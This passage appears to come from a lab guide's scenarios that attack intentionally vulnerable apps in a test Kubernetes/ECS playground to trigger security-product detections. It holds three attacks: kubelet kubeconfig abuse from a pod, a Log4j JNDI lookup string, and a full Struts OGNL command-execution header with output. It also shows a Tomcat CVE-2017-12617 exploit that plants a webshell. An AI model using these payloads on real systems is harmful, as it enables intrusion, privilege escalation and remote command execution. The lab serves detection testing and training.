host system resources like docker containers, configurations, etc.  Trying to use the docker client fails.  <pre><code>$ docker ps\n</code></pre> <pre><code>bash: docker: command not found\n</code></pre>  This does not work, since we're on a Kubernetes optimized node OS with no docker provided.  <pre><code>$ uname -a\n</code></pre> <pre><code>Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Jul 12 18:40:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre>  The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.  <pre><code>$ cat /var/lib/kubelet/kubeconfig\n</code></pre> <pre><code>apiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    certificate-authority: /etc/kubernetes/pki/ca.crt\n    server: https://BD215DBE2E4127977439D904B2AD3307.gr7.eu-central-1.eks.amazonaws.com\n  name: kubernetes\ncontexts:\n- context:\n    cluster: kubernetes\n    user: kubelet\n  name: kubelet\ncurrent-context: kubelet\nusers:\n- name: kubelet\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1beta1\n      command: /usr/bin/aws-iam-authenticator\n      args:\n        - \"token\"\n        - \"-i\"\n        - \"playground-one-eks\"\n        - --region\n        - \"eu-central-1\"\n</code></pre>  Sadly, there is no `kubectl` as well.  <pre><code>$ kubectl\n</code></pre> <pre><code>bash: kubectl: command not found\n</code></pre>  Trying to use the package manager `yum` will not solve the problem. But navigating to  will help:  <pre><code>$ cd\n$ curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\n$ chmod +x kubectl\n</code></pre>  Try to get the available nodes of our cluster:  <pre><code>$ ./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes </code></pre> <pre><code>NAME                                            STATUS   ROLES    AGE   VERSION\nip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad\nip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad\n</code></pre>  Can you do more?  <pre><code>$ ./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A\n</code></pre> <pre><code>NAMESPACE           NAME                                               READY   STATUS    RESTARTS   AGE\ngoat                system-monitor-6dfbdbb7d-w6mdv                     1/1     Running   0          53m\nkube-system         aws-load-balancer-controller-577dcc6f77-sqtfr      1/1     Running   0          92m\nkube-system         aws-node-8wl6v                                     1/1     Running   0          92m\nkube-system         aws-node-ksdjv                                     1/1     Running   0          92m\nkube-system         cluster-autoscaler-6696cf9bff-2s52q                1/1     Running   0          92m\nkube-system         coredns-6bcddfff7-hrwwl                            1/1     Running   0          92m\nkube-system         coredns-6bcddfff7-kp266                            1/1     Running   0          92m\nkube-system         ebs-csi-controller-7dffd5b9fd-2w7r8                6/6     Running   0          92m\nkube-system         ebs-csi-controller-7dffd5b9fd-fdhfc                6/6     Running   0          92m\nkube-system         ebs-csi-node-k77sx                                 3/3     Running   0          92m\nkube-system         ebs-csi-node-vj6c7                                 3/3     Running   0          92m\nkube-system         kube-proxy-62dls                                   1/1     Running   0          92m\nkube-system         kube-proxy-mshz7                                   1/1     Running   0          92m\ntrendmicro-system   trendmicro-admission-controller-74d8d7f866-dv87r   1/1     Running   0          53m\ntrendmicro-system   trendmicro-oversight-controller-557df87c9-6c4dx    2/2     Running   0          69m\ntrendmicro-system   trendmicro-scan-manager-6ddb6f69b8-r85dk           1/1     Running   0          53m\ntrendmicro-system   trendmicro-scout-gkl4k                             2/2     Running   0          69m\ntrendmicro-system   trendmicro-scout-tz68w                             2/2     Running   0          69m\ntrendmicro-system   trendmicro-usage-controller-6944c5b55b-m8hgh       2/2     Running   0          53m\ntrendmicro-system   trendmicro-workload-operator-6cf5c98c6f-xq8bb      1/1     Running   0          69m\ntrivy-system        trivy-operator-57c774d7c4-hmnlk                    1/1     Running   0          53m\nvictims             java-goof-5878dd4dd-9lnst                          1/1     Running   0          53m\nvictims             web-app-854bdf944f-ddqcs                           1/1     Running   0          53m\n</code></pre> <pre><code>$ ./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes </code></pre> <pre><code>NAME                                            STATUS   ROLES    AGE   VERSION\nip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad\nip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad\n</code></pre>  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/container-security-eks-privileged-shell/","title":"Scenario: Vision One Container Security Gain a Privileged Shell","text":""},{"location":"scenarios/container-security-eks-privileged-shell/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security</li> <li>Playground One EKS Cluster</li> <li>Running app: </li> </ul>"},{"location":"scenarios/container-security-eks-privileged-shell/#exploiting","title":"Exploiting","text":""},{"location":"scenarios/container-security-eks-privileged-shell/#exploit","title":"Exploit","text":""},{"location":"scenarios/container-security-eks-runtime-violations/","title":"Scenario: Vision One Container Security Generate Runtime Violations","text":""},{"location":"scenarios/container-security-eks-runtime-violations/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security</li> <li>Playground One EKS Cluster</li> <li>Running app: </li> </ul>"},{"location":"scenarios/container-security-eks-runtime-violations/#exploiting","title":"Exploiting","text":""},{"location":"scenarios/container-security-eks-runtime-violations/#exploit","title":"Exploit","text":""},{"location":"scenarios/container-security-eks-runtime-vulnerability/","title":"Scenario: Vision One Container Security Find Runtime Vulnerabilities","text":""},{"location":"scenarios/container-security-eks-runtime-vulnerability/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security</li> <li>Playground One EKS Cluster</li> <li>Running app: </li> </ul>"},{"location":"scenarios/container-security-eks-runtime-vulnerability/#exploiting","title":"Exploiting","text":""},{"location":"scenarios/container-security-eks-runtime-vulnerability/#exploit","title":"Exploit","text":""},{"location":"scenarios/eks/","title":"EKS","text":""},{"location":"scenarios/eks/#kubernetes-autoscaling","title":"Kubernetes Autoscaling","text":"<p>Logs:</p> <pre><code>kubectl logs -f -n kube-system -l app=cluster-autoscaler\n</code></pre>"},{"location":"scenarios/sentry/","title":"Sentry","text":"<p>To create findings and scan with Sentry run</p> <pre><code>$PGPATH/terraform-awsone/0-scripts/create-findings.sh\n</code></pre> <p>Feel free to have a look on the script above, but in theory it should prepare six findings for Sentry and two Workbenches in Vision One.</p> <p>To trigger Sentry scans for any instance run (example):</p> <pre><code># INSTANCE=&lt;INSTANCE_ID&gt; sentry-trigger-ebs-scan\nINSTANCE=$(terraform output -raw public_instance_ip_web1) sentry-trigger-ebs-scan\n</code></pre> <p>The scan results should show up in your Cloud One Central console.</p>"},{"location":"scenarios/xdr-for-containers-ecs-ec2-malware-upload/","title":"Scenario: Vision One XDR for Containers Detect Malware Upload","text":""},{"location":"scenarios/xdr-for-containers-ecs-ec2-malware-upload/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One XDR for Containers linked with Playground One VPC</li> <li>Playground One ECS Cluster (Any variant)</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul>"},{"location":"scenarios/xdr-for-containers-ecs-ec2-malware-upload/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>$ pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr-for-containers-ecs-ec2-malware-upload/#exploit","title":"Exploit","text":"<p>Navigate to http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/todolist</p> <p>Click <code>[Sign in]</code></p> <ul> <li>Username: <code>${jndi:ldap://host.docker.internal:9999/Commons2}</code></li> <li>Password: <code>does not matter</code></li> </ul> <p>Vision One Observed Attack Techniques:</p> <p></p> <p>Note: The currently deployed app is not vulnerable for Log4j, the technique from above still triggers the exploitation attempt.</p>"},{"location":"scenarios/xdr-for-containers-ecs-log4j/","title":"Scenario: Detect JNDI Injection in HTTP Request (Log4j)","text":""},{"location":"scenarios/xdr-for-containers-ecs-log4j/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One XDR for Containers linked with Playground One VPC</li> <li>Playground One ECS Cluster (Any variant)</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul>"},{"location":"scenarios/xdr-for-containers-ecs-log4j/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>$ pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr-for-containers-ecs-log4j/#exploit","title":"Exploit","text":"<p>Navigate to http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/todolist</p> <p>Click <code>[Sign in]</code></p> <ul> <li>Username: <code>${jndi:ldap://host.docker.internal:9999/Commons2}</code></li> <li>Password: <code>does not matter</code></li> </ul> <p>Vision One Observed Attack Techniques:</p> <p></p> <p>Note: The currently deployed app is not vulnerable for Log4j, the technique from above still triggers the exploitation attempt.</p>"},{"location":"scenarios/xdr-for-containers-ecs-struts/","title":"Scenario: Detect Log4j","text":""},{"location":"scenarios/xdr-for-containers-ecs-struts/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One XDR for Containers linked with Playground One VPC</li> <li>Playground One ECS Cluster (Any variant)</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>$ cd ${ONEPATH}\n$ unzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr-for-containers-ecs-struts/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>$ pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr-for-containers-ecs-struts/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>$ cd ${ONEPATH}/exploits/struts/\n$ struts-exploit.sh playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 18.195.245.32:80...\n* Connected to playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com (18.195.245.32) port 80 (#0)\n&gt; GET /todolist/todolist/ HTTP/1.1\n&gt; Host: playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 \n&lt; Date: Tue, 01 Aug 2023 12:45:58 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; \nLD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\nECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/46de0786-9920-42aa-bff4-c17fd4d273c5\nCATALINA_HOME=/usr/local/tomcat\nLANG=C.UTF-8\nHOSTNAME=ip-10-0-175-104.eu-central-1.compute.internal\n...\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nmessagebus:x:101:101::/var/run/dbus:/bin/false\n* transfer closed with outstanding read data remaining\n* Closing connection 0\ncurl: (18) transfer closed with outstanding read data remaining\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr-for-containers-ecs-tomcat-rce/","title":"Scenario: Detect Tomcat RCE","text":""},{"location":"scenarios/xdr-for-containers-ecs-tomcat-rce/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One XDR for Containers linked with Playground One VPC</li> <li>Playground One ECS Cluster (Any variant)</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>$ cd ${ONEPATH}\n$ unzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr-for-containers-ecs-tomcat-rce/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>$ pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr-for-containers-ecs-tomcat-rce/#checking-if-app-server-is-vulnerable","title":"Checking if app server is vulnerable","text":"<p>Now you can check to see if the tomcat server is vulnerable. If it is you should see something similar to the following:</p> <pre><code>$ cd ${ONEPATH}/exploits/tomcat-rce/\n$ python3 exploit.py -u http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n</code></pre> <pre><code>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / \n | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /  \n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   \n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/    \n\n[@intx0x80]\n\nPoc Filename  Poc.jsp\nhttp://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com it's Vulnerable to CVE-2017-12617\nhttp://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp\n</code></pre> <p>If you point a browser at http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp you should get a test page with a bunch of \"A\" char's - that shows the exploit worked.</p> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr-for-containers-ecs-tomcat-rce/#inject-the-exploit-and-run-commands-in-the-container-from-browser","title":"Inject the exploit and run commands in the container from browser","text":"<p>Next, inject the exploit and just hit <code>ENTER</code> at the shell prompt that comes up. (Ignore the error afterward)</p> <pre><code>$ python3 exploit.py -u http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com -p pwn\n</code></pre> <pre><code>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / \n | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /  \n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   \n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/    \n\n[@intx0x80]\n\nUploading Webshell .....\n$ \n</code></pre> <p>Either in the shell or from within your browser http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/pwn.jsp test some commands like <code>whoami</code> or <code>dpkg -l</code>.</p> <p>Your browser should present you a blank page with a form containing single field and a <code>Run</code> button. Type any Linux command you want and submit the form. The results will populate the page.</p> <p>Vision One Observed Attack Techniques:</p> <p></p>"}]}